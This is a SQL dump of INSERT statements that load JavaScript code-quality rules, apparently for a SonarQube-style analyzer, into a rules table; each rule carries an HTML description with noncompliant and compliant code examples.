INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1132, 'Web SQL databases should not be used', 'S2817', NULL, 'javascript', '<p>
  The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some browsers. (It is not supported in
  Firefox or IE.)
</p>

<p>
  Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
var db = window.openDatabase("myDb", "1.0", "Personal secrets stored here", 2*1024*1024);  // Noncompliant
</pre>

<h2>See</h2>
<ul>
  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>
  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities">OWASP Top Ten 2013 Category A9</a> - Using Components with Known Vulnerabilities</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2h', NULL, NULL, 'html5,owasp-a6,owasp-a9', false, 'HTML', 1510817813249, 1510817813250, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1133, 'Default parameters should not cause side effects', 'S3509', NULL, 'javascript', '<p>The assignment of default parameter values is generally intended to help the caller. But when a default assignment causes the side effects, the caller may not be aware of the extra changes or may not fully understand their implications. I.e. default assignments with side effects may end up hurting the caller, and for that reason, they should be avoided.</p>

<h2>Noncompliant Code Example</h2>
<pre>
var count = 0;

function go(i = count++) {  // Noncompliant
  console.log(i);
}

go();  // outputs 0
go(7); // outputs 7
go();  // outputs 1
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'es2015,pitfall', false, 'HTML', 1510817813251, 1510817813251, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1134, 'Deprecated jQuery methods should not be used', 'S2770', NULL, 'javascript', '<p>
  Deprecation is a warning that a method has been superseded, and will eventually be removed. The deprecation period allows you to make a smooth transition away from the aging,
  soon-to-be-retired technology.
</p>

<p>This rule raises an issue when any of the following methods is used:</p>

<ul>
  <li><code>.andSelf()</code></li>
  <li><code>.context</code></li>
  <li><code>.die()</code></li>
  <li><code>.error()</code></li>
  <li><code>jQuery.boxModel</code></li>
  <li><code>jQuery.browser</code></li>
  <li><code>jQuery.sub()</code></li>
  <li><code>jQuery.support</code></li>
  <li><code>.live()</code></li>
  <li><code>.load()</code></li>
  <li><code>.selector</code></li>
  <li><code>.size()</code></li>
  <li><code>.toggle()</code></li>
  <li><code>.unload()</code></li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'jquery,obsolete', false, 'HTML', 1510817813252, 1510817813252, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1141, 'Jump statements should not be followed by other statements', 'UnreachableCode', NULL, 'javascript', '<p>Jump statements (<code>return</code>, <code>break</code> and <code>continue</code>) and <code>throw</code> expressions move control flow out of the current code block. Typically, any statements in a block that come after a jump or <code>throw</code> are simply wasted keystrokes lying in wait to confuse the unwary. </p>
<h2>Noncompliant Code Example</h2>

<pre>
fun(a) {
  var i = 10;
  return i + a;       // Noncompliant 
  i++;             // this is never executed
}
</pre>
<h2>Compliant Solution</h2>

<pre>
int fun(int a) {
  int i = 10;
  return i + a;
}
</pre>
<h2>See</h2>

<ul>
<li> MISRA C++:2008, 0-1-9 - There shall be no dead code</li>
<li> MISRA C:2012, 2.2 - There shall be no dead code</li>
<li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect or is never executed</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,misra,unused', false, 'HTML', 1510817813259, 1510817813259, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1142, 'Relational operators should be used in "for" loop termination conditions', 'S888', NULL, 'javascript', '<p>
  Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an infinite loop.
  Using a relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an infinite loop.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.
{
  //...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
for (var i = 1; i <= 10; i += 2)  // Compliant
{
  //...
}
</pre>

<h2>Exceptions</h2>
<p>An equality operator may be used if the loop counter is not modified within the body of the loop and either:</p>
<ul>
  <li>starts below the ending value and is incremented by 1 on each iteration.</li>
  <li>starts above the ending value and is decremented by 1 on each iteration.</li>
</ul>
<p>Equality operators are also ignored when the test is against <code>null</code>.</p>
<pre>
for (int i = 0; arr[i] != null; i++) {
  // ...
}

for (int i = 0; (item = arr[i]) != null; i++) {
  // ...
}
</pre>

<h2>See</h2>
<ul>
  <li>MISRA C++:2008, 6-5-2</li>
  <li><a href="http://cwe.mitre.org/data/definitions/835">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition (''Infinite Loop'')</li>
  <li><a href="https://www.securecoding.cert.org/confluence/x/EwDJAQ">CERT, MSC21-C</a> - Use robust loop termination conditions</li>
  <li><a href="https://www.securecoding.cert.org/confluence/x/GwDJAQ">CERT, MSC21-CPP</a> - Use inequality to terminate a loop whose counter changes by more than one</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,cwe,misra', false, 'HTML', 1510817813260, 1510817813260, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1143, 'Avoid use of conditional operator', 'ConditionalOperator', NULL, 'javascript', '<p>
Condition operators can quickly become hard to be read.
</p>

<p>
The following code snippet illustrates this rule :
</p>

<pre>
function sayHello() {
  var a = (a === ''A'') ? ''is A'' : ''is not A''; // Non-Compliant
}
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817813261, 1510817813261, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1144, 'Switch cases should end with an unconditional "break" statement', 'NonEmptyCaseWithoutBreak', NULL, 'javascript', '<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:                              
    foo();
    break;
  case 2:  // Both ''doSomething()'' and ''doSomethingElse()'' will be executed. Is it on purpose ?
    doSomething();
  default:                               
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:                              
    foo();
    break;
  case 2: 
    doSomething();
    break;
  default:                               
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>

<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:                               
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                                // Use of throw statement
    throw new IllegalStateException();
  case 4:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional 
    doSomethingElse();
}
</pre>

<h2>See</h2>

<ul>
<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>
<li> MISRA C:2004, 15.2 - An unconditional break statement shall terminate every non-empty switch clause</li>
<li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>
<li> MISRA C++:2008, 6-4-5 - An unconditional throw or break statement shall terminate every non-empty switch-clause</li>
<li> MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>
<li> MISRA C:2012, 16.3 - An unconditional break statement shall terminate every switch-clause</li>
<li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C</a> - Finish every set of statements associated with a case label with a break statement</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/ZoFLAQ">CERT, MSC18-CPP</a> - Finish every set of statements associated with a case label with a break statement</li>
</ul>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,cwe,misra,pitfall', false, 'HTML', 1510817813262, 1510817813262, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1145, '"with" statements should not be used', 'WithStatement', NULL, 'javascript', '<p>
  The use of the <code>with</code> keyword produces an error in JavaScript strict mode code. However, that''s not the worst that can be said against <code>with</code>.
</p>
<p>
  Using <code>with</code> allows a short-hand access to an object''s properties - assuming they''re already set. But use <code>with</code> to access some property not already set in the object,
  and suddenly you''re catapulted out of the object scope and into the global scope, creating or overwriting variables there. Since the effects of <code>with</code> are entirely
  dependent on the object passed to it, <code>with</code> can be dangerously unpredictable, and should never be used.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var x = ''a'';

var foo = {
  y: 1
}

with (foo) {  // Noncompliant
  y = 4;  // updates foo.x
  x = 3;  // does NOT add a foo.x property; updates x var in outer scope
}
print(foo.x + " " + x); // shows: undefined 3
</pre>

<h2>Compliant Solution</h2>
<pre>
var x = ''a'';

var foo = {
  y: 1
}

foo.y = 4;
foo.x = 3;

print(foo.x + " " + x); // shows: 3 a
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817813263, 1510817813264, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1146, 'Sections of code should not be "commented out"', 'CommentedCode', NULL, 'javascript', '<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>
<h2>See</h2>

<ul>
<li> MISRA C:2004, 2.4 - Sections of code should not be "commented out".</li>
<li> MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments.</li>
<li> MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments.</li>
<li> MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out"</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra,unused', false, 'HTML', 1510817813264, 1510817813264, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1147, 'Regular expression on comment', 'CommentRegularExpression', NULL, 'javascript', '<p>This rule template can be used to create rules which will be triggered when a comment matches a given regular expression.</p>
<p>For example, one can create a rule with the regular expression "<code>.*TODO.*</code>" to match all comment containing "TODO".</p>
<p>Note that, in order to match TODO regardless of the case, the "<code>(?i)</code>" modifier can be prepended to the expression, as in "<code>(?i).*TODO.*</code>".</p>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, true, 'HTML', 1510817813265, 1510817813265, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1155, 'Named function expressions should not be used', 'NamedFunctionExpression', NULL, 'javascript', '<p>
  While named function expressions might be useful for debugging purposes, some browsers do not support them correctly (for example Internet Explorer 8).
</p>

<h2>Noncompliant Code Example</h2>
<pre>
f = function fun(){}; // Non-Compliant;  named function expression
</pre>

<h2>Compliant Solution</h2>
<pre>
fun = function(){}; // Compliant; function expression
</pre>

<h2>Exceptions</h2>
<p>ECMAScript 6 generator functions are excluded from this rule.</p>
<pre>
function* f() {} // Compliant; generator function.
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cross-browser,user-experience', false, 'HTML', 1510817813276, 1510817813277, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1148, '"if ... else if" constructs shall be terminated with an "else" clause', 'ElseIfWithoutElse', NULL, 'javascript', '<p>This rule applies whenever an <code>if</code> statement is followed by one or </p>
<p>more <code>else if</code> statements, the final <code>else if</code> shall be followed by an <code>else</code> statement.</p>
<p>The requirement for a final <code>else</code> statement is defensive programming. </p>
<p>The <code>else</code> statement should either take appropriate action or contain </p>
<p>a suitable comment as to why no action is taken. This is consistent with the </p>
<p>requirement to have a final <code>default</code> clause in a <code>switch</code></p>
<p>statement. </p>

<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (x == 0) {
  doSomething();
} else if (x == 1) {
  doSomethingElse();
} else {
  throw new IllegalStateException();
}
</pre>

<h2>See</h2>

<ul>
<li> MISRA C:2004, 14.10</li>
<li> MISRA C++:2008, 6-4-2</li>
<li> MISRA C:2012, 15.7</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/PQHRAw">CERT, MSC64-Java</a> - Strive for logical completeness</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra', false, 'HTML', 1510817813267, 1510817813268, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1149, 'Functions should not be too complex', 'FunctionComplexity', NULL, 'javascript', '<p>The cyclomatic complexity of functions should not exceed a defined threshold.</p>
<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'LINEAR_OFFSET', NULL, '1min', NULL, '10min', 'per complexity point above the threshold', NULL, 'brain-overload', false, 'HTML', 1510817813268, 1510817813269, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1150, 'Selection results should be tested with "length"', 'S2769', NULL, 'javascript', '<p>
  Once you''ve made a selection, you typically want to know whether it actually found anything. Since selectors always return an object (the set of selected DOM elements), the
  best way to see whether your selection found anything is to test the returned object''s .length property.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if ( $( "div.foo" ) ) {  // Noncompliant
  // this code always runs, even when the selector didn''t match any elements
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
// Testing whether a selection contains elements.
if ( $( "div.foo" ).length > 0) {
  // this code only runs if elements were found
  //  ...
}
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'jquery', false, 'HTML', 1510817813270, 1510817813271, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1151, '"switch" statements should end with a "default" clause', 'SwitchWithoutDefault', NULL, 'javascript', '<p>
The requirement for a final <code>default</code> clause is defensive programming.
The clause should either take appropriate action or contain a suitable comment as to why no action is taken.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
switch (param) {  //missing default clause
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}

switch (param) {
  default: // default clause should be the last one
    error();
    break;
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
switch (param) {
  case 0:
    doSomething();
    break;
  case 1:
    doSomethingElse();
    break;
  default:
    error();
    break;
}
</pre>

<h2>See</h2>

<ul>
<li> MISRA C:2004, 15.0 - The MISRA C <em>switch</em> syntax shall be used.</li>
<li> MISRA C:2004, 15.3 - The final clause of a switch statement shall be the default clause</li>
<li> MISRA C++:2008, 6-4-3 - A switch statement shall be a well-formed switch statement.</li>
<li> MISRA C++:2008, 6-4-6 - The final clause of a switch statement shall be the default-clause</li>
<li> MISRA C:2012, 16.1 - All switch statements shall be well-formed</li>
<li> MISRA C:2012, 16.4 - Every <em>switch</em> statement shall have a <em>default</em> label</li>
<li> MISRA C:2012, 16.5 - A <em>default</em> label shall appear as either the first or the last <em>switch label</em> of a <em>switch</em> statement</li>
<li> <a href="http://cwe.mitre.org/data/definitions/478.html">MITRE, CWE-478</a> - Missing Default Case in Switch Statement</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/YgE">CERT, MSC01-C</a> - Strive for logical completeness</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/JoIyAQ">CERT, MSC01-CPP</a> - Strive for logical completeness</li>
</ul>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe,misra', false, 'HTML', 1510817813271, 1510817813272, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1158, 'Variable declarations should be placed appropriately for their scope', 'S2392', NULL, 'javascript', '<p>A variable that is declared at function scope, but only used inside a single block should be declared in that block, and variables that are declared inside a block but used outside of it (which is possible with a <code>var</code>-style declaration) should be declared outside the block.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function doSomething(a, b) {
  var i;  // Noncompliant; should be declared in if-block
  if (a &gt; b) {
    i = a;
    console.log(i);
    var x = a - b;  // Noncompliant; should be declared outside if-block
  }

  if (a &gt; 4) {
   console.log(x);
  }

  return a+b;
}
</pre>

<h2>Compliant Solution</h2>
<pre>
function doSomething(a, b) {
  var x = a - b;

  if (a &gt; b) {
    var i = a;
    console.log(i);
  }

  if (a &gt; 4) {
   console.log(x);
  }

  return a+b;
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813280, 1510817813281, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1159, 'Trailing commas should not be used', 'TrailingComma', NULL, 'javascript', '<p>
  Most browsers parse and discard a meaningless, trailing comma. Unfortunately, that''s not the case for Internet Explorer below version 9, which throws a meaningless error. Therefore trailing commas should be eliminated.
</p>

<h2>Noncompliant Code Example</h2>

<pre>
var settings = {
    ''foo''  : oof,
    ''bar'' : rab,    // Noncompliant - trailing comma
};
</pre>

<h2>Compliant Solution</h2>
<pre>
var settings = {
    ''foo''  : oof,
    ''bar'' : rab
};
</pre>', 4, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'cross-browser', false, 'HTML', 1510817813282, 1510817813282, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1160, 'Class methods should be used instead of "prototype" assignments', 'S3525', NULL, 'javascript', '<p>Originally JavaScript didn''t support <code>class</code>es, and class-like behavior had to be kludged using things like <code>prototype</code> assignments for "class" functions.
  Fortunately, ECMAScript 2015 added classes, so any lingering <code>prototype</code> uses should be  converted to true <code>class</code>es. The new syntax is more expressive and clearer, especially to those with experience in other languages.</p>
<p>Specifically, with ES2015, you should simply declare a <code>class</code> and define its methods inside the class declaration.</p>

<h2>Noncompliant Code Example</h2>
<pre>
function MyNonClass(initializerArgs = []) {
  this._values = [...initializerArgs];
}

MyNonClass.prototype.doSomething = function () {  // Noncompliant
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
class MyClass {
  constructor(initializerArgs = []) {
    this._values = [...initializerArgs];
  }

  doSomething() {
    //...
  }
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'es2015', false, 'HTML', 1510817813283, 1510817813283, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1161, 'Element type selectors should not be used with class selectors', 'S2714', NULL, 'javascript', '<p>Using element type in class selectors is slower than using only the class selector.</p>

<h2>Noncompliant Code Example</h2>

<pre>var $products = $("div.products");    // Noncompliant - slow</pre>

<h2>Compliant Solution</h2>

<pre>var $products = $(".products");    // Compliant - fast</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'jquery,performance,user-experience', false, 'HTML', 1510817813284, 1510817813284, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1162, 'JQuery cache variables should comply with a convention name', 'S2713', NULL, 'javascript', '<p>Shared naming conventions allow teams to collaborate efficiently.
  This rule checks that all variables names that are used to store/cache jQuery objects match a provided regular expression.</p>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'convention,jquery', false, 'HTML', 1510817813285, 1510817813285, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1163, 'Universal selectors should not be used', 'S2716', NULL, 'javascript', '<p>
  Element selections that could be matched anywhere in the document can be very slow. That''s why use of the universal selector, <code>*</code>, should be limited; it explicitly
  specifies that the match could be anywhere.
</p>

<h2>Noncompliant Code Example</h2>

<pre>$( ".buttons > *" );  // Noncompliant; extremely expensive</pre>

<h2>Compliant Solution</h2>

<pre>$( ".buttons" ).children(); // Compliant</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'jquery,performance,user-experience', false, 'HTML', 1510817813286, 1510817813287, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1168, '"defaults" should be a function when objects or arrays are used', 'S2550', NULL, 'javascript', '<p>
  When using the Backbone.js framework, model <code>defaults</code> should be a function rather than an object if it contains arrays or objects. This is because objects and arrays are passed by reference in JavaScript. So a <code>defaults</code> object that contains arrays or objects is going to set the default value of every instance to point to the same shared object or array.
</p>
<p>
  Use a function instead and a fresh copy of the object or array will be peeled off for each instance.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var Person = Backbone.Model.extend({
  defaults: {  // Noncompliant; every instance of Person will share the same instance of favoriteColors
    favoriteColors: ["blue","purple","raspberry"]
  }
});
</pre>

<h2>Compliant Solution</h2>
<pre>
var Person = Backbone.Model.extend({
  defaults: function() {
    return {
      favoriteColors: ["blue","purple","raspberry"]
    };
  }
});
</pre>', 3, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'backbone', false, 'HTML', 1510817813292, 1510817813292, 2);
